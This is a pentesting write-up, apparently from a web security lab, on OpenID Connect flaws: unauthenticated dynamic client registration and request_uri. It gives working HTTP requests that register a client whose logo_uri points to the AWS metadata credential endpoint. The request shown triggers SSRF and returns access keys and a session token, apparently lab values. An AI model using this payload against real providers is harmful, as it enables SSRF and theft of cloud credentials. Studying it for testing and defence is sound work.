# Unprotected dynamic client registration

OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a `POST` request to a dedicated `registration endpoint`.

```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-0a49007104101d0f80a9b039028b0021.oauth-server.net

HTTP/1.1 OK
...
"registration_endpoint":"https://oauth-0a49007104101d0f80a9b039028b0021.oauth-server.net/reg",
...
```

In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on:
```http
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```

The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used.

### SSRF registering an arbitrary client application
Registered an arbitrary client application whose logo points to an internal file:
```http
POST /reg HTTP/2
Host: oauth-0a49007104101d0f80a9b039028b0021.oauth-server.net
Content-Type: application/json
Accept: application/json
Content-Length: 164

{
"redirect_uris":["https://0a5600d103788bb080432bac006700c5.web-security-academy.net/oauth-callback"],
"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}


HTTP/2 201 Created
{
...
"client_id":"yuaSTlgu9Sr2DvqIkxFJY",
...
"redirect_uris":["https://0a5600d103788bb080432bac006700c5.web-security-academy.net/oauth-callback"],
"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
...
}
```

When we authenticate using the arbitrary registered client, the OAuth server tries to retrieve the logo for the current client, triggering a [Server Side Request Forgery (SSRF)](Server%20Side%20Request%20Forgery%20(SSRF).md)  and exposing some secrets:
```http
GET /auth?client_id=yuaSTlgu9Sr2DvqIkxFJY&redirect_uri=https://0a5600d103788bb080432bac006700c5.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0a1d009003318be08017298f0296002b.oauth-server.net


...

GET /client/yuaSTlgu9Sr2DvqIkxFJY/logo HTTP/2
Host: oauth-0a1d009003318be08017298f0296002b.oauth-server.net

HTTP/2 200 OK
{
"Code" : "Success",
"LastUpdated" : "2023-04-28T13:12:21.802021957Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "GPd2FCck7fJfIWh8TlEi",
"SecretAccessKey" : "Yi6QelRfIIF5aXDEgfJob1OtG7sPRfUZ7rTwn5LD",
"Token" : "a9N3fN9UeK1IlU5rmjPVhIgj15DG7hcgxLLarGuvzs7ud6yd9UOxh4gWbRQBIHhyE4patipOcN2IKWnZBW5SYbvdbInwYVvK8Kt5H7lWpQk53fJVIK5jAYNgfMV8gBV8lzlhxugqdsFOQUC2lVPD67dPh2R7wGESNEV8Q8KsDxGNgVZwdKLkkKjp6v6I8JMGlq1QImrD3ufBX5tsJGcb0UjIbpMN8NGJgpvvhqoV3nZf6JBj9EMUNPa36iM0gST8",
"Expiration" : "2029-04-26T13:12:21.802021957Z"
}
```


# Allowing authorization requests by reference

Up to this point, we've looked at the standard way of submitting the required parameters for the authorization request i.e. via the query string. Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead.

If this feature is supported, you can send a single `request_uri` parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values. Depending on the configuration of the OAuth service, this `request_uri` parameter is another potential vector for [Server Side Request Forgery (SSRF)](Server%20Side%20Request%20Forgery%20(SSRF).md)

You might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the `redirect_uri`.

To check whether this option is supported, you should look for the `request_uri_parameter_supported` option in the configuration file and documentation. Alternatively, you can just try adding the `request_uri` parameter to see if it works. You will find that some servers support this feature even if they don't explicitly mention it in their documentation.